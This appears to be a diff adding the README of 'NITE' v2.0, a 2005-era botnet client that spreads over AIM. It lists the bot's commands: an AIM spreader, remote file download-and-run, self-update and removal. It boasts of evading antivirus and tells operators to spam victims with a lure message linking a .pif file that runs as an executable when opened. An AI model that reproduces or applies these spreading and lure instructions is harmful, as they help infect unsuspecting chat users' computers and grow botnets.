@@ -1,0 +1,57 @@
+
+NNNNNNNN        NNNNNNNN IIIIIIIIII TTTTTTTTTTTTTTTTTTTTTTT EEEEEEEEEEEEEEEEEEEEEE
+N:::::::N       N::::::N I::::::::I T:::::::::::::::::::::T E::::::::::::::::::::E
+N::::::::N      N::::::N I::::::::I T:::::::::::::::::::::T E::::::::::::::::::::E
+N:::::::::N     N::::::N II::::::II T:::::TT:::::::TT:::::T EE::::::EEEEEEEEE::::E
+N::::::::::N    N::::::N   I::::I   TTTTTT  T:::::T  TTTTTT   E:::::E       EEEEEE
+N:::::::::::N   N::::::N   I::::I           T:::::T           E:::::E             
+N:::::::N::::N  N::::::N   I::::I           T:::::T           E::::::EEEEEEEEEE   
+N::::::N N::::N N::::::N   I::::I           T:::::T           E:::::::::::::::E   
+N::::::N  N::::N:::::::N   I::::I           T:::::T           E:::::::::::::::E   
+N::::::N   N:::::::::::N   I::::I           T:::::T           E::::::EEEEEEEEEE   
+N::::::N    N::::::::::N   I::::I           T:::::T           E:::::E             
+N::::::N     N:::::::::N   I::::I           T:::::T           E:::::E       EEEEEE
+N::::::N      N::::::::N II::::::II       TT:::::::TT       EE::::::EEEEEEEE:::::E
+N::::::N       N:::::::N I::::::::I       T:::::::::T       E::::::::::::::::::::E
+N::::::N        N::::::N I::::::::I       T:::::::::T       E::::::::::::::::::::E
+NNNNNNNN         NNNNNNN IIIIIIIIII       TTTTTTTTTTT       EEEEEEEEEEEEEEEEEEEEEE
+
+
+		* By m1rr0r *
+	   	  * v 2.0 *
+
+Other Credits: acidstorm, dynamic
+
+============================================================================
+I am not responsible for anything you do, 
+destroy, or any damage you cause while using this software, 
+I am not to be help accountable for ANYTHING relating to this software.
+============================================================================
+
+Features:
+	-AIM Spreading
+	-Remove
+	-Download / Update
+	-3.5KB when packed
+	-Undetected as of 5/12/05
+
+Commands:
+	-a <Text Here>
+		*Start AIM Spreader
+	-r
+		*Remove Bot
+	-d <URL> <Destination> <Run(1or0)> <Update(1or0)>
+		*Download A File
+	-c
+		*Reconnect
+
+Notes:
+	-Bot does NOT take a command prefix.
+	-Ignore any warnings.
+
+How to use:
+	-Compile the bot, and run it on a bunch of bots that have aim on them.
+	-Put a timer in your bot chan spamming something like this:
+		"a this looks like you www.link-to-your-bot.com/pic.pif
+	-a .pif file will run as an executeable when they open it
+	-You can also do URLS in the format: <a href="url-here">HERE!</a>
